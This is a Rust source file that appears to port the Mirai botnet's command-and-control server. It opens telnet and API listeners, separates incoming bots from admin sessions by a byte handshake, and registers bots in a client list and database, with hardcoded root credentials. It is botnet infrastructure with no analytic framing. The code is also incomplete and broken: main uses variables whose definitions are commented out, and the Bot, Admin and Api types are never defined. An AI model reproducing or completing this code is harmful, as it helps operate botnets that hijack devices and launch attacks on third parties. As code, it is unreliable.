use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::thread;
use std::time::{Duration, SystemTime};

const DATABASE_ADDR: &str = "127.0.0.1";
const DATABASE_USER: &str = "root";
const DATABASE_PASS: &str = "password";
const DATABASE_TABLE: &str = "mirai";

// Assuming ClientList and Database structures and their methods are already defined
// let client_list = ClientList::new();
// let database = Database::new(DATABASE_ADDR, DATABASE_USER, DATABASE_PASS, DATABASE_TABLE);

fn main() {
    let tel_listener = TcpListener::bind("0.0.0.0:23").unwrap_or_else(|err| {
        eprintln!("Error binding telnet listener: {}", err);
        std::process::exit(1);
    });

    let api_listener = TcpListener::bind("0.0.0.0:101").unwrap_or_else(|err| {
        eprintln!("Error binding API listener: {}", err);
        std::process::exit(1);
    });

    let client_list = client_list.clone();
    let database = database.clone();

    thread::spawn(move || {
        for api_conn in api_listener.incoming() {
            match api_conn {
                Ok(conn) => {
                    let client_list = client_list.clone();
                    let database = database.clone();
                    thread::spawn(move || api_handler(conn, &client_list, &database));
                }
                Err(e) => eprintln!("API connection error: {}", e),
            }
        }
    });

    for tel_conn in tel_listener.incoming() {
        match tel_conn {
            Ok(conn) => {
                let client_list = client_list.clone();
                let database = database.clone();
                thread::spawn(move || initial_handler(conn, &client_list, &database));
            }
            Err(e) => eprintln!("Telnet connection error: {}", e),
        }
    }

    println!("Stopped accepting clients");
}

fn initial_handler(mut conn: TcpStream, client_list: &ClientList, database: &Database) {
    let _ = conn.set_read_timeout(Some(Duration::new(10, 0)));

    let mut buf = [0u8; 32];
    let l = match conn.read(&mut buf) {
        Ok(l) if l > 0 => l,
        _ => return,
    };

    if l == 4 && buf[0..3] == [0x00, 0x00, 0x00] {
        let source = if buf[3] > 0 {
            let mut string_len = [0u8; 1];
            let l = match conn.read(&mut string_len) {
                Ok(l) if l > 0 => l,
                _ => return,
            };

            if string_len[0] > 0 {
                let mut source_buf = vec![0u8; string_len[0] as usize];
                let l = match conn.read(&mut source_buf) {
                    Ok(l) if l > 0 => l,
                    _ => return,
                };
                String::from_utf8_lossy(&source_buf).into_owned()
            } else {
                String::new()
            }
        } else {
            String::new()
        };

        Bot::new(conn, buf[3], source, client_list, database).handle();
    } else {
        Admin::new(conn).handle();
    }
}

fn api_handler(conn: TcpStream, client_list: &ClientList, database: &Database) {
    Api::new(conn, client_list, database).handle();
}

fn read_x_bytes(conn: &mut TcpStream, buf: &mut [u8]) -> std::io::Result<()> {
    let mut total_read = 0;

    while total_read < buf.len() {
        let n = conn.read(&mut buf[total_read..])?;
        if n == 0 {
            return Err(std::io::Error::new(std::io::ErrorKind::UnexpectedEof, "Connection closed unexpectedly"));
        }
        total_read += n;
    }

    Ok(())
}

fn netshift(prefix: u32, netmask: u8) -> u32 {
    prefix >> (32 - netmask)
}
